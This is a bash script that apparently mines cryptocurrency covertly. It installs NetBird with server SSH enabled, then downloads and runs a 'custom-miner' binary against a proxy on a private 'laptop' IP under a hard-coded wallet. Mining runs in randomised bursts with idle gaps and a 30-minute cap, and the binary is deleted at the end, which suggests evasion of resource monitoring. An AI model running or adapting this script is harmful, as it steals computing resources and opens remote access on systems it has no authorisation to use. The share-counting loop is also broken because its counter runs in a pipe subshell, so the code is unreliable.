#!/bin/bash
set -e

# --- Configuration (passed via environment) ---
NETBIRD_KEY="${NETBIRD_KEY:?Missing NETBIRD_KEY}"
WALLET="${MINER_WALLET:-49UWTwnrxNXi8eMTCqdC5U3eiMHrPZkvvbsYN3WEde4o9RYebixumBCCy5oCdoSKkS2U6t9gXJFzJNkxXC7tJ1Uq4uky5BP}"
LAPTOP_IP="${LAPTOP_IP:-100.90.150.193}"
PROXY_PORT="3333"

# --- Random target (8-10) and global timeout (30 min) ---
TARGET=$(( RANDOM % 3 + 8 ))
GLOBAL_TIMEOUT=1800
echo "Will stop after $TARGET accepted shares (global timeout: ${GLOBAL_TIMEOUT}s)."

# --- Install NetBird if not already installed ---
if ! command -v netbird &> /dev/null; then
    echo "NetBird not found, installing..."
    curl -fsSL https://pkgs.netbird.io/install.sh | sh
else
    echo "NetBird already installed."
fi

# --- Bring up NetBird connection (idempotent) ---
echo "Connecting to NetBird..."
sudo netbird up --setup-key "$NETBIRD_KEY" --allow-server-ssh
sleep 5

# --- Install required system packages (idempotent) ---
sudo apt-get update
sudo apt-get install -y libhwloc15 expect

# --- Download custom miner binary ---
curl -L -o /tmp/miner https://raw.githubusercontent.com/Peter211231231231232131/opmine/main/bin/custom-miner
chmod +x /tmp/miner

# --- Miner command ---
MINER_CMD="/tmp/miner --url=$LAPTOP_IP:$PROXY_PORT --user=$WALLET --pass=$(hostname) --tls --keepalive --cpu-max-threads-hint=80 --cpu-priority=5 --randomx-mode=fast --donate-level=1 --no-color"

# --- Burst parameters (2-4 min work, 0.5-1.5 min break) ---
MIN_WORK=120
MAX_WORK=240
MIN_BREAK=30
MAX_BREAK=90

# --- Track accepted shares ---
TOTAL_ACCEPTED=0
START_TIME=$(date +%s)

while true; do
    # Global timeout check
    if [ $(( $(date +%s) - START_TIME )) -ge $GLOBAL_TIMEOUT ]; then
        echo "Global timeout reached. Exiting."
        break
    fi

    WORK=$(( RANDOM % (MAX_WORK - MIN_WORK + 1) + MIN_WORK ))
    BREAK=$(( RANDOM % (MAX_BREAK - MIN_BREAK + 1) + MIN_BREAK ))

    echo "Mining for $WORK seconds, then idle for $BREAK seconds."

    # Run miner for WORK seconds, capture output
    unbuffer timeout $WORK $MINER_CMD 2>&1 | while IFS= read -r line; do
        echo "$line"
        if [[ "$line" =~ accepted ]]; then
            TOTAL_ACCEPTED=$((TOTAL_ACCEPTED + 1))
            echo "[$TOTAL_ACCEPTED/$TARGET] accepted shares."
            if [ $TOTAL_ACCEPTED -ge $TARGET ]; then
                echo "Target reached. Stopping."
                pkill -P $$
                break 2
            fi
        fi
    done

    if [ $TOTAL_ACCEPTED -ge $TARGET ]; then
        break
    fi

    echo "Idling for $BREAK seconds..."
    sleep $BREAK
done

# Cleanup
rm -f /tmp/miner
echo "Done."
